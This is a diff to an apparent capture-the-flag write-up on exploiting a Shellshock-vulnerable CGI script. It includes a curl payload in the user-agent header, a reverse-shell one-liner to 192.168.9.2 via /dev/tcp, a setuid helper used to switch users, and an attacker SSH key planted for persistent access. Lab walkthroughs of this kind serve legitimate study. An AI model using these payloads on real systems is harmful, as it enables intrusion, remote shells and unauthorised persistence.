@@ -86,14 +86,28 @@ $ curl -A "() { :;}; echo; /bin/bash -c 'id'" http://$IP:$PORT/cgi-bin/vulnerabl
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
+## Reverse shell
 reverse shell with `nc -lvp 1337` and `curl -A "() { :;}; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.9.2/1337 0>&1'" http://$IP:$PORT/cgi-bin/vulnerable -u $AUTH`.
 
-the home folder has a `touchmenot.sh`, when executed, the user is changed to joaquim.
+the home folder has a `touchmenot.sh`, when executed, the user is changed to `joaquim`.
 
 ```bash
-$ cd /home/joaquim
+www-data@01557ef5aa3b:/usr/lib/cgi-bin$ cd /home
+www-data@01557ef5aa3b:/home$ ./touchmenot.sh
 $ id
 uid=33(www-data) gid=33(www-data) euid=1000(joaquim) egid=1000(joaquim) groups=1000(joaquim),33(www-data)
+
+$ cd /home/joaquim
+
+$ ls -lah
+total 28K
+drwxr-xr-x 1 joaquim joaquim 4.0K May 21 11:21 .
+drwxr-xr-x 1 root    root    4.0K May 21 11:21 ..
+-rw-r--r-- 1 joaquim joaquim  220 Sep 25  2014 .bash_logout
+-rw-r--r-- 1 joaquim joaquim 3.4K Sep 25  2014 .bashrc
+-rw-r--r-- 1 joaquim joaquim  675 Sep 25  2014 .profile
+drwx------ 2 joaquim joaquim 4.0K May 21 11:21 .ssh
+-rw------- 1 joaquim joaquim  341 May 21 11:21 ssh_config.txt
 
 $ cat ssh_config.txt
 SSH server is running on a deprecated version.
@@ -109,10 +123,12 @@ To access the server, execute the following command:
 ssh -i key user@ip
 ```
 
-on attacker machine the key ist created
+## Plant ssh key
+on attacker machine the key is created
 ```bash
 $ ssh-keygen -t ed25519 -C "your_email@example.com"
-$ cat key.pub ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJe+bjgEz9hKqWcFT6bX8bfppr1aTM5zC46oQ/M9Yzd9 your_email@example.com
+$ cat key.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJe+bjgEz9hKqWcFT6bX8bfppr1aTM5zC46oQ/M9Yzd9 your_email@example.com
 ```
 
 through reverse shell
@@ -124,7 +140,8 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQSZDrYvsA+71Dsj52F8d5/qBsURESHx8e++XPigszh
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJe+bjgEz9hKqWcFT6bX8bfppr1aTM5zC46oQ/M9Yzd9 your_email@example.com
 ```
 
-now connection can be established using `ssh -i key joaquim@$IP`
+## Exfiltrate the flag
+now connection can be established using `ssh -i key joaquim@$IP` from attacker
 
 the user is in sudo group and wont require a password. so now look for the key.
 
